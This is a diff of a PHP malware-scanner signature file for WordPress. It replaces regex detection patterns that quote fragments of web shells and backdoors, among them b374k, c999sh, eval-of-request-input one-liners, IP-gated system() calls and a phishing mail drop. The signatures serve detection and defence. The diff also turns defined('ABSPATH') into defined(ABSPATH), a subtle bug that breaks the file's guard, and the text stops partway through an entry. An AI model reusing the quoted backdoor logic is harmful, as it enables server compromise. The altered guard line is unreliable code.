@@ -2,7 +2,7 @@
 
 namespace FirePhage\Security\Scanner;
 
-if (! defined('ABSPATH')) {
+if (! defined(ABSPATH)) {
     exit;
 }
 
@@ -14,7778 +14,245 @@ final class SignatureBundle
     public static function manifest(): array
     {
         return array (
-  'version' => '2026.03.11.225916',
+  'version' => '2026.03.11.233903',
   'high_confidence_patterns' => 
   array (
     0 => 
     array (
-      'pattern' => '/, E_USER_ERROR\\);
-\\}
+      'pattern' => '/\\<\\!\\-\\-w0yamEFi\\-\\-\\>
+\\<\\?php
 
-\\$functions \\= \\$root \\.[\\s\\S]{0,160}, E_USER_ERROR\\);
-\\}
-
-\\$host \\= \\$_SERVER\\[/',
-      'label' => 'sample-specific literal chain',
+error_reporting\\(E_ALL\\);[\\s\\S]{0,12000}ion\\(\'wp_head\', function \\(\\) \\{\\\\n"\\.
+"\\?\\>\\\\n"\\.
+"\\<scr/s',
+      'label' => 'sample-specific content window chain',
     ),
     1 => 
     array (
-      'pattern' => '/https\\:\\/\\/blackshelter\\.org\\/tw9ZIwYM9BY5A6iRcUJQxDBX5PMf7GL4\\-DBJejgkisyv/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/wp_register_script\\(\'wpe_main_script\', \\$scr[\\s\\S]{0,12000}strtotime\\("\\-\\$days_to_subtract days"\\)\\);
+    \\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
     2 => 
     array (
-      'pattern' => '/eval\\(base64_decode\\(\\$_GET\\[\'lol\'\\]\\)\\);/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/print_r\\(\\$_POST\\[\'funct\'\\]\\(\\$_POST\\[\'argv\'\\]\\)\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     3 => 
     array (
-      'pattern' => '/\\$?kwainkwain\\b/',
-      'label' => 'sample-specific identifier',
+      'pattern' => '/\\$c \\= "AddType application\\/x\\-httpd\\-php \\.htaccess"\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     4 => 
     array (
-      'pattern' => '/runcommand[\\s\\S]{0,120}canirun[\\s\\S]{0,120}etcpasswdfile/',
-      'label' => 'sample-specific token chain',
+      'pattern' => '/\'pouet\'\\.\'pif\' \\. \'pouet\' \\. "lol" \\."kwainkwain"\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     5 => 
     array (
-      'pattern' => '/ec38fe2a8497e0a8d6d349b3533038cb/',
-      'label' => 'sample-specific encoded fragment',
+      'pattern' => '/zSlRFMklUMHdLV1FyUFZ3bk1Gd25PekVnWWoxaE96a29NU0J[\\s\\S]{0,12000}put type\\=submit value\\=\\\\"Log in\\\\"\\>
+\\<\\/form\\>";
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
     6 => 
     array (
-      'pattern' => '/b374k shell 3\\.2\\.3[\\s\\S]{0,12000}\\$func\\="cr"\\."eat"\\."e_fun"\\."cti"\\."on";\\$b374k\\=\\$func\\(\'\\$x\',\'ev\'\\.\'al\'\\.\'\\("\\?\\>"\\.gz\'\\.\'in\'\\.\'fla\'\\.\'te\\(ba\'\\.\'se\'\\.\'64\'\\.\'_de\'\\.\'co\'\\.\'de\\(\\$x\\)\\)\\);\'\\);\\$b374k\\("7P1r/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/d\\>\'\\.\\$row\\[\'Index_type\'\\]\\.\'\\<\\/td\\>\'\\);
+						p\\(\'\\<td\\>\'\\.\\(\\$row\\[\'Non_unique\'\\] \\? \'No\' \\: \'Yes\'\\)\\.\'&nbsp;\\<\\/td\\>\'\\);
+						p\\(\'\\<td\\>\'\\.\\(\\$row/s',
+      'label' => 'sample-specific content window',
     ),
     7 => 
     array (
-      'pattern' => '/\\$url\\s+\\=\\s+\\$GLOBALS\\["k1r4_updateurl"\\]\\."\\?version\\="\\.urlencode\\(base64_encode\\(\\$GLOBALS\\["shver"\\]\\)\\)\\."&updatenow\\="\\.\\(\\$updatenow\\?"1"\\:"0"\\)\\."&";/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/\\<\\?php
+\\/\\*
+	b374k shell 3\\.2\\.3
+	Jayalah Indonesiaku
+	\\(c\\)2014
+	https\\:\\/\\/github\\.com\\/b374k\\/b374k
+
+\\*\\/
+\\$GLOBALS\\[\'pass\'\\] \\= "fb621f/s',
+      'label' => 'sample-specific content window',
     ),
     8 => 
     array (
-      'pattern' => '/\\$url\\s+\\=\\s+\\$GLOBALS\\["c999sh_updateurl"\\]\\."\\?version\\="\\.urlencode\\(base64_encode\\(\\$GLOBALS\\["shver"\\]\\)\\)\\."&updatenow\\="\\.\\(\\$updatenow\\?"1"\\:"0"\\)\\."&";/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/\\<\\/body\\>\\<\\/html\\>\\<\\?php chdir\\(\\$lastdir\\); exit\\(\\); \\?\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     9 => 
     array (
-      'pattern' => '/\\]\\[0\\]\\);\\}
-
-     unset\\(\\$arr\\[\\$k\\],\\$arr\\[\\$k\\+1\\]\\);
-
-    \\}
-
-   \\}
-
-  \\}
-
- \\}
-
- else \\{return FALSE;\\}
-
-\\}
-
-\\}
-
-if \\(\\!function_exists\\(/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/\\<\\/body\\>\\<\\/html\\>\\<\\?php chdir\\(\\$lastdir\\); c999shexit\\(\\); \\?\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     10 => 
     array (
-      'pattern' => '/\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\//',
-      'label' => 'source-file head snippet',
+      'pattern' => '/yId\\(\'ghdescon\'\\)\\.src\\.substr\\(22\\)\\)\\.match\\(\\/ghdescon\\(\\.\\*\\?\\)ghdescon\\/\\)\\[1\\]\\)\\)\\.apply\\(this\\);kk\\(11\\);\\}, 500\\);
+\\<\\/script\\>
+\\<\\/body\\>\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
     ),
     11 => 
     array (
-      'pattern' => '/\\>\\<b\\>No ReadAble\\<\\/b\\>";
-
-		 \\}
-
-		\\}else \\{
-
-		echo "&nbsp;";
-
-		 \\}
-
-		echo "
-
-		\\<\\/a\\>\\<\\/font\\>\\<\\/td\\>
-
-		\\<td width\\=/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\/
+\\/\\*
+\\/\\*/s',
+      'label' => 'sample-specific content window',
     ),
     12 => 
     array (
-      'pattern' => '/\\<meta http\\-equiv\\="Content\\-Type" content\\="text\\/html; charset\\=windows\\-1256"\\>\\<meta http\\-equiv\\="Content\\-Language" content\\="ar\\-sa"\\>[\\s\\S]{0,12000}setTimeout\\(function\\(\\)\\{new Function\\(atob\\(atob\\(document\\.getElementById\\(\'ghdescon\'\\)\\.src\\.substr\\(22\\)\\)\\.match\\(\\/ghdescon\\(\\.\\*\\?\\)ghdescon\\/\\)\\[1\\]\\)\\)\\.apply\\(t/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/nt\\>\\<\\/td\\>
+
+		\\<td height\\=\'28\' align\\=\'center\'\\>\\<font[\\s\\S]{0,12000}4\\);\\}, 500\\);
+\\<\\/script\\>
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
     13 => 
     array (
-      'pattern' => '/\\<\\?php \\/\\/ Copyright 2016 \\- Do not attempt to reverse engineer this file\\. Please contact us for details, quoting the ScriptID\\. \\(ScriptID\\:ID\\/20[\\s\\S]{0,12000}\\$OI0IO10101OI0I01\\=__FILE__;\\$O10I0I01O1OI01OIOI\\=72;eval\\(base64_decode\\(\'JE9JMEkwMU8xMElPSU9JMEk9Zm9wZW4oJE9JMElPMTAxMDFPSTBJMDEsJ3JiJyk7JE8xT0/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/"101%" height\\="15" nowrap bordercolor\\="\\#C0C0C0"[\\s\\S]{0,12000};
+\\<\\/script\\>
+				                \\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
     14 => 
     array (
-      'pattern' => '/\\<\\?php \\$payload\\="83QPy0p0t0hPNs6pSnEPK\\/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA\\=\\=";preg_replace\\(\'\\/\\.\\*\\/e\',"\\\\x65\\\\x76\\\\x61\\\\x6c\\\\x28\\\\x62\\\\x61\\\\x73\\\\x65/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php \\/\\/ Copyright 2016 \\- Do not attempt to reverse engineer this file\\. Please contact us for details, quoting the ScriptID\\. \\(ScriptID\\:ID\\/20/s',
+      'label' => 'source-file first-line anchor',
     ),
     15 => 
     array (
-      'pattern' => '/\\/\\/ https\\:\\/\\/rstforums\\.com\\/forum\\/topic\\/98500\\-php\\-malware\\-finder\\/\\?do\\=findComment&comment\\=615687[\\s\\S]{0,12000}print_r\\(\\$_POST\\[\'funct\'\\]\\(\\$_POST\\[\'argv\'\\]\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php \\$payload\\="83QPy0p0t0hPNs6pSnEPK\\/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA\\=\\=";preg_replace\\(\'\\/\\.\\*\\/e\',"\\\\x65\\\\x76\\\\x61\\\\x6c\\\\x28\\\\x62\\\\x61\\\\x73\\\\x65/s',
+      'label' => 'source-file first-line anchor',
     ),
     16 => 
     array (
-      'pattern' => '/7bac13f112c39fc9a88cccda9ea4c998267079eeS03OyFcoriwuSc3VUIl3dw2JVi9Qj9W0BgA\\=/',
-      'label' => 'sample-specific encoded fragment',
+      'pattern' => '/base64_decode\\(YiunIUY76bBhuhNYIO8\\(\\$XnNhAWEnhoiqw[\\s\\S]{0,12000}c998267079eeS03OyFcoriwuSc3VUIl3dw2JVi9Qj9W0BgA\\=/s',
+      'label' => 'sample-specific content window chain',
     ),
     17 => 
     array (
-      'pattern' => '/\\# This is a sample of PHP malware discovered 2017\\/11\\/15\\.[\\s\\S]{0,12000}\\<\\?php \\$awvjtnz \\= \'fmhpph\\#\\)zbssb\\!\\-\\#\\}\\#\\)fepmqnj\\!\\/\\!\\#0\\#\\)idubn`hfsq\\)\\!sp\\!\\*\\#ojnopm3qjA\\)qj3hopmA	x273qj%6\\<\\*Y%\\)fnbozcYufhA	x%\\=\\*h%\\)m%\\)\\:fmjix\\:\\<\\#\\#\\:\\>\\:h%\\:\\</s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\# This is a sample of PHP malware discovered 2017\\/11\\/15\\./s',
+      'label' => 'source-file first-line anchor',
     ),
     18 => 
     array (
-      'pattern' => '/ID5gID5gIDJ7bmEtZSIgPTBgcGhwX6VuYW7lKDksDi5gID5gID5gID5gIDJwaHCfdmVyc2lvbiIgPTBgcGhwdmVyc2lvbigpL5og[\\s\\S]{0,160}ID5gID5gID5gID5id6NvX6ZlcnNpb2BiIA3\\+IEdTT70WRVJTSU0OL5ogID5gID5gID5gID5ic2EmZW7vZGUiIA3\\+I1CpbmlfZ2V3/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/5gIDCkaWUoIjQwNDIpOwp0DgpmdW9jdGlvbiCXU30zZXRjb2[\\s\\S]{0,12000};eval\\/\\*k\\*\\/\\(ngomynsz\\(\\$fuwkgtdbkv, \\$jgzzljfjj\\)\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
     19 => 
     array (
-      'pattern' => '/\\* The base configurations of the WordPress\\.[\\s\\S]{0,12000}YTKY7Geso8iShLmL\\/QXbtCswu8Tv\\+SDbrGc99l94uC6J/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/YTKY7Geso8iShLmL\\/QXbtCswu8Tv\\+SDbrGc99l94uC6J\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     20 => 
     array (
-      'pattern' => '/\\<\\?php\\s+\\$\\{\\$\\{eval\\(\\$_POST\\[ice\\]\\)\\}\\};\\?\\>/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/^\\s*\\<\\?php \\$\\{\\$\\{eval\\(\\$_POST\\[ice\\]\\)\\}\\};\\?\\>/s',
+      'label' => 'source-file first-line anchor',
     ),
     21 => 
     array (
-      'pattern' => '/@include "\\\\x2fh\\\\x6fm\\\\x65\\/\\\\x77e\\\\x62p\\\\x6ce\\\\x78x\\\\x33\\/\\\\x70u\\\\x62l\\\\x69c\\\\x5fh\\\\x74m\\\\x6c\\/\\\\x68i\\\\x73\\-\\\\x68e\\\\x6d\\.\\\\x6fr\\\\x67\\/\\\\x5f_\\\\x4dA\\\\x43O\\\\x53X\\\\x2fm\\\\x6fd/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\<\\?php
+\\/\\*8a68d\\*\\/
+@include "\\\\x2fh\\\\x6fm\\\\x65\\/\\\\x77e\\\\x[\\s\\S]{0,12000}\\/\\\\x68i\\\\x73\\-\\\\x68e\\\\x6d\\.\\\\x6fr\\\\x67\\/\\\\x5f_\\\\x4dA\\\\x43O\\\\x/s',
+      'label' => 'sample-specific content window chain',
     ),
     22 => 
     array (
-      'pattern' => '/\\<\\?\\$x\\=\\$_GET;\\(\\$x\\[p\\]\\=\\=\'_\'\\?\\$x\\[f\\]\\(\\$x\\[c\\]\\)\\:y\\);/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?\\$x\\=\\$_GET;\\(\\$x\\[p\\]\\=\\=\'_\'\\?\\$x\\[f\\]\\(\\$x\\[c\\]\\)\\:y\\);/s',
+      'label' => 'source-file first-line anchor',
     ),
     23 => 
     array (
-      'pattern' => '/\\<\\?\\$x\\=explode\\(\'~\',base64_decode\\(substr\\(getallheaders\\(\\)\\[\'x\'\\],1\\)\\)\\);@\\$x\\[0\\]\\(\\$x\\[1\\]\\);/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?\\$x\\=explode\\(\'~\',base64_decode\\(substr\\(getallheaders\\(\\)\\[\'x\'\\],1\\)\\)\\);@\\$x\\[0\\]\\(\\$x\\[1\\]\\);/s',
+      'label' => 'source-file first-line anchor',
     ),
     24 => 
     array (
-      'pattern' => '/cwd\'    \\=\\> \\$cwd,
+      'pattern' => '/e its contents
+    try \\{
+        \\$stdout \\= base6[\\s\\S]{0,12000}err\' \\=\\> \\[\\],
+        \'cwd\'    \\=\\> \\$cwd,
     \\]\\)\\);
-\\}
-
-\\# File\\-upload payload
-function payload_upload \\(\\$cwd, \\$args\\) \\{
-
-    \\# cd to the trojan/',
-      'label' => 'sample-specific literal',
+\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
     25 => 
     array (
-      'pattern' => '/ob_start\\(function \\(\\$c,\\$d\\)\\{register_shutdown_function\\(\'assert\',\\$c\\);\\}\\);[\\s\\S]{0,12000}echo \\$_REQUEST\\[\'pass\'\\];/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/php 
+ob_start\\(function \\(\\$c,\\$d\\)\\{register_shutdown_function\\(\'assert\',\\$c\\);\\}\\); 
+echo \\$_REQUEST\\[\'pass\'\\]; 
+ob_end_flush\\(\\); 
+\\?\\>/s',
+      'label' => 'sample-specific content window',
     ),
     26 => 
     array (
-      'pattern' => '/\\/\\* https\\:\\/\\/blog\\.sucuri\\.net\\/2014\\/04\\/php\\-callback\\-functions\\-another\\-way\\-to\\-hide\\-backdoors\\.html \\*\\/[\\s\\S]{0,12000}@array_diff_ukey\\(@array\\(\\(string\\)\\$_REQUEST\\[\'password\'\\]\\=\\>1\\), @array\\(\\(string\\)stripslashes\\(\\$_REQUEST\\[\'re_password\'\\]\\)\\=\\>2\\),\\$_REQUEST\\[\'login\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/@array_diff_ukey\\(@array\\(\\(string\\)\\$_REQUEST\\[\'password\'\\]\\=\\>1\\), @array\\(\\(string\\)stripslashes\\(\\$_REQUEST\\[\'re_password\'\\]\\)\\=\\>2\\),\\$_REQUEST\\[\'login\'\\]\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
     27 => 
     array (
-      'pattern' => '/\\<\\?php extract\\(\\$_REQUEST\\); @die\\(\\$ctime\\(\\$atime\\)\\);/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php extract\\(\\$_REQUEST\\); @die\\(\\$ctime\\(\\$atime\\)\\);/s',
+      'label' => 'source-file first-line anchor',
     ),
     28 => 
     array (
-      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}\\<\\!\\-\\- Load system style CSS \\-\\-\\>/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php                                                                                                                                       [\\s\\S]{0,18000}\\<\\!\\-\\- Load system style CSS \\-\\-\\>\\s*$/s',
+      'label' => 'source-file first-last anchor',
     ),
     29 => 
     array (
-      'pattern' => '/if \\(\\$SERVER\\["REMOTEADDR"\\]\\=\\="178\\.162\\.201\\.166" && md5\\(\\$REQUEST\\[\'secure\'\\]\\)\\=\\="7f02b0ae0869cc5aa38cd7ca6c767c92"\\)\\{ system\\(\\$REQUEST\\[\'secmd\'\\]\\); \\}[\\s\\S]{0,12000}system\\(base64_decode\\("ZWNobyAnT3JkZXIgRGVueSxBbGxvd2BkZW55IGZyb20gYWxsYDxGaWxlcyBzdWJkaXJlY3RvcnkvKj5gICAgIGRlbnkgZnJvbSBhbGxgPC9GaWxlcz5gPE/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\<\\?php
+if \\(\\$SERVER\\["REMOTEADDR"\\]\\=\\="178\\.162\\.201\\.16[\\s\\S]{0,12000}CBJTlRPIGFtcHVzZXJzICh1c2VybmFtZSxwYXNzd29yZF9za/s',
+      'label' => 'sample-specific content window chain',
     ),
     30 => 
     array (
-      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=14&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[51\\]\\=\\$p\\[51\\]\\.[\\s\\S]{0,12000}\\$p\\[84\\]\\)&&\\(\\$p\\[69\\]\\=\\$p\\[51\\]\\(\\$p\\[69\\]\\)\\)&&\\(\\$p\\=\\$p\\[69\\]\\(\\$p\\[36\\],\\$p\\[51\\]\\(\\$p\\[32\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\(\\$p\\[51\\]\\=\\$p\\[51\\]\\.
+\\$p\\[84\\]\\)&&\\(\\$p\\[69\\]\\=\\$p\\[51\\]\\(\\$p\\[69\\]\\)\\)[\\s\\S]{0,12000}\\]\\(\\$p\\[32\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;
+
+\\/\\/QWER\\:36\\-51\\-84\\-69\\-32\\-14/s',
+      'label' => 'sample-specific content window chain',
     ),
     31 => 
     array (
-      'pattern' => '/\\<\\?php if\\(isset\\(\\$_GET\\["evmym"\\]\\)\\)\\{echo"\\<font color\\=\\#FFFFFF\\>\\[uname\\]"\\.php_uname\\(\\)\\."\\[\\/uname\\]";echo "\\<br\\>";print "\\\\n";if\\(@ini_get\\("disable_functio/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php if\\(isset\\(\\$_GET\\["evmym"\\]\\)\\)\\{echo"\\<font color\\=\\#FFFFFF\\>\\[uname\\]"\\.php_uname\\(\\)\\."\\[\\/uname\\]";echo "\\<br\\>";print "\\\\n";if\\(@ini_get\\("disable_functio/s',
+      'label' => 'source-file first-line anchor',
     ),
     32 => 
     array (
-      'pattern' => '/\\)
-    \\{
-        if \\(\\!self\\:\\:isPermittedPath\\(\\$path\\) or \\!@is_file\\(\\$path\\)\\) \\{
-            \\$this\\-\\>setError\\(\\$this\\-\\>lang\\(/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/re\\.\'  \\<\\/div\\>
+\\<div\\>Full Report \\: \\<pre\\>\'\\.\\$response\\-\\>report\\.\'\\<\\/pre\\>\\<\\/div\\>\';
+print \'    \\<\\/div\\>\';
+    \\}
+\\}
+print \'\\<\\/body\\>\';
+\\?\\>/s',
+      'label' => 'sample-specific content window',
     ),
     33 => 
     array (
-      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>[\\s\\S]{0,12000}@unlink\\(__FILE__\\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdOdmJtWnBaeUE5SUdGeWNtRjVLQW9nSW5abGNuTnBiMjRpSUQwK0lDSXlMakF1TWpBeE1TNHhNREE1SWl3Z0x5b2dZblZwYkdR/s',
+      'label' => 'source-file first-line anchor',
     ),
     34 => 
     array (
-      'pattern' => '/\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdOdmJtWnBaeUE5SUdGeWNtRjVLQW9nSW5abGNuTnBiMjRpSUQwK0lDSXlMakF1TWpBeE1TNHhNREE1SWl3Z0x5b2dZblZwYkdR/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\?\\>\\s*$/s',
+      'label' => 'exact source-file content',
     ),
     35 => 
-    array (
-      'pattern' => '/\\$ud4d324d\\="\\\\142\\\\x61\\\\x73\\\\x65\\\\66\\\\64\\\\137\\\\x64\\\\x65\\\\x63\\\\x6f\\\\144\\\\145";@eval\\(\\$ud4d324d\\(/',
-      'label' => 'sample-specific line fragment',
-    ),
-    36 => 
-    array (
-      'pattern' => '/eval\\(str_rot13\\(gzinflate\\(str_rot13\\(base64_decode\\(\'LUnXDrY4Dn2a0fx7VC\\/aK23v8ERhSfTeO0K\\/MBqkJECc2LF9QbzUw\\/10649rvYdl\\+TMOxYIh\\/5uXKZmXP\\/nQR\\/n978/',
-      'label' => 'source-file tail snippet',
-    ),
-    37 => 
-    array (
-      'pattern' => '/\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdSbFptRjFiSFJmZFhObFgyRnFZWGdnUFNCMGNuVmxPd29rWTI5c2IzSWdQU0FpTldSbVpqSTJJanNLSkdSbFptRjFiSFJmWTJo/',
-      'label' => 'source-file tail snippet',
-    ),
-    38 => 
-    array (
-      'pattern' => '/\\$Receive_email\\="mapbay@protonmail\\.com";/',
-      'label' => 'source-file tail snippet',
-    ),
-    39 => 
-    array (
-      'pattern' => '/\\|\\-\\-\\- http\\:\\/\\/www\\.geoiptool\\.com\\/\\?IP\\=\\$ip \\-\\-\\-\\-\\\\n[\\s\\S]{0,160};
-	\\$send \\= \\$Receive_email;
-	\\$subject \\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    40 => 
-    array (
-      'pattern' => '/\\>"\\.\\$peth\\."\\<\\/a\\>\\/";
-							\\}\\/\\/foreach
-						echo "
-						\\<\\/td\\>
-					\\<\\/tr\\>
-					\\<tr\\>
-						\\<td\\>";
-						if\\(isset\\(\\$_FILES\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    41 => 
-    array (
-      'pattern' => '/\\$qJ1An \\= str_replace\\(\\$GLOBALS\\[Ã£ÃªÃ¬\\]\\[0x5\\], \\$GLOBALS\\[Ã£ÃªÃ¬\\]\\[0x6\\], \\$qJ1An\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    42 => 
-    array (
-      'pattern' => '/r\'\\);fseek\\(\\$handle, 369\\);\\$data \\= stream_get_contents\\(\\$handle\\);fclose\\(\\$handle\\);\\$f \\= create_function\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    43 => 
-    array (
-      'pattern' => '/\\$qJ1An \\= str_replace\\(\\$GLOBALS\\[ãêì\\]\\[0x5\\], \\$GLOBALS\\[ãêì\\]\\[0x6\\], \\$qJ1An\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    44 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: Wordpress CMS Module[\\s\\S]{0,12000}\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\//s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    45 => 
-    array (
-      'pattern' => '/\\$password \\= "laRBWAcUyvd"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    46 => 
-    array (
-      'pattern' => '/use JMS\\\\Serializer\\\\SerializerBuilder;[\\s\\S]{0,12000}\\-\\>setSerializationVisitor\\(\'json\', \\$visitor\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    47 => 
-    array (
-      'pattern' => '/\\$str \\= file_get_contents\\("\\.\\.\\/\\.\\.\\/wp\\-config\\.php"\\);[\\s\\S]{0,12000}touch\\("\\.\\.\\/\\.\\.\\/wp\\-config\\.php", \\$ftime1, \\$ftime1\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    48 => 
-    array (
-      'pattern' => '/\\$jnvntef \\= \'\\*d_6t9obrm45il\\\\\'2x3\\-vukpycsfangH\\#e\';[\\s\\S]{0,12000}vzidf\\(\\$mplyvsq, \\$mplyvsq\\[5\\]\\(\\$mplyvsq\\[2\\], \\$boalhd \\^ ptclequ\\(\\$mplyvsq, \\$qhsxt, \\$mplyvsq\\[8\\]\\(\\$boalhd\\)\\)\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    49 => 
-    array (
-      'pattern' => '/\\$bwcex \\= \'\\#y_Hd3745pn9xei6olgmc\\-ar1s\\\\\'t8buk0\\*v\';[\\s\\S]{0,12000}eval\\( \\$cwgiloi\\[1\\]\\( \\$cwgiloi\\[2\\] \\) \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    50 => 
-    array (
-      'pattern' => '/\\$btmrp \\= \'_bod2l\\*9cv4xkiu1\\#ayrg\\\\\'\\-sHn06mf7t83ep5\';[\\s\\S]{0,12000}yjnorq\\(\\$hhmxjbe, \\$hhmxjbe\\[5\\]\\(\\$hhmxjbe\\[2\\], \\$pvdukpz \\^ fhxfiq\\(\\$hhmxjbe, \\$wemrnt, \\$hhmxjbe\\[8\\]\\(\\$pvdukpz\\)\\)\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    51 => 
-    array (
-      'pattern' => '/\\$_COOKIE\\[\'timestamp\'\\] \\= isset\\(\\$_COOKIE\\[\'timestamp\'\\]\\) \\? \\$_COOKIE\\[\'timestamp\'\\] \\: \'\';[\\s\\S]{0,12000}eval\\(\\/\\*12\\*\\/str_rot13\\(\\/\\*23\\*\\/base64_decode\\(\\$result, true\\)\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    52 => 
-    array (
-      'pattern' => '/\\>Download Config\\<\\/font\\>\\<\\/a\\>\\<\\/center\\>\\<\\/p\\>\\<\\/h3\\>\'\\);\\}\\}if\\(\\$_POST\\[\'alfa2\'\\]\\=\\=\'\\>\\>\'\\)\\{echo __pre\\(\\);\\$colors \\= json_decode\\(\\$_POST\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    53 => 
-    array (
-      'pattern' => '/\';
-  \\$unzipper\\-\\>prepareExtraction\\(\\$archive, \\$destination\\);
-\\}
-
-if \\(isset\\(\\$_POST\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    54 => 
-    array (
-      'pattern' => '/@ini_set\\(\'error_log\',NULL\\);[\\s\\S]{0,12000}echo "\\<script\\>window\\.location\\.href \\= \'i\\.php\\?\' \\+ Math\\.random\\(\\);\\<\\/script\\>";/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    55 => 
-    array (
-      'pattern' => '/PD9waHAgdW5saW5rKCdGVU5MSU5LRk5BTUUnKTsgQGluaV9zZXQoJ2Vycm9yX2xvZycsI65785VT6578/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    56 => 
-    array (
-      'pattern' => '/\\$data\\s+\\=\\s+@file_put_contents\\(\\$lokasi\\."\\/"\\.\\$_FILES\\[\'berkas\'\\]\\[\'name\'\\],\\s+@file_get_contents\\(\\$_FILES\\[\'berkas\'\\]\\[\'tmp_name\'\\]\\)\\);/',
